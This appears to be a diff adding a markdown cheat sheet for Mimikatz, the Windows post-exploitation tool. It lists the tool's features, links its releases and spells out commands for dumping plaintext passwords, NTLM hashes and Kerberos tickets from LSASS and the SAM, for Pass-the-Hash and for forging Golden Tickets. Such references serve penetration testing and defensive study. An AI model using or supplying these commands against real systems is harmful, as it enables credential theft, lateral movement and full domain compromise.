@@ -1,0 +1,54 @@
+ Mimikatz
+
+1. Overview
+Mimikatz is a powerful post-exploitation tool used to extract plaintext passwords, hashes, Kerberos tickets, and authentication tokens from Windows memory.
+
+Widely used for:
+- Privilege escalation  
+- Credential dumping  
+- Lateral movement  
+- Pass-the-Hash & Pass-the-Ticket attacks  
+
+---
+
+2. Key Features
+- Extract plaintext passwords (if WDigest enabled)  
+- Dump NTLM hashes  
+- Dump Kerberos tickets (TGT & TGS)  
+- Golden Ticket and Silver Ticket attacks  
+- Pass-the-Hash execution  
+- LSASS memory extraction  
+
+---
+
+3. Installation
+
+Windows (recommended)
+  Download from the official repo:  
+  https://github.com/gentilkiwi/mimikatz/releases
+
+Run from PowerShell as Administrator:
+```powershell
+.\mimikatz.exe
+
+---
+
+4. Common Commands
+Basic
+privilege::debug
+token::elevate
+
+Dump all credentials
+sekurlsa::logonpasswords
+
+Dump hashes (SAM)
+lsadump::sam
+
+Dump Kerberos Tickets
+sekurlsa::tickets
+
+Pass-the-Hash
+sekurlsa::pth /user:admin /ntlm:<hash> /domain:<domain> /run:cmd.exe
+
+Golden Ticket
+kerberos::golden /user:admin /domain:test.local /sid:<sid> /krbtgt:<hash> /id:500
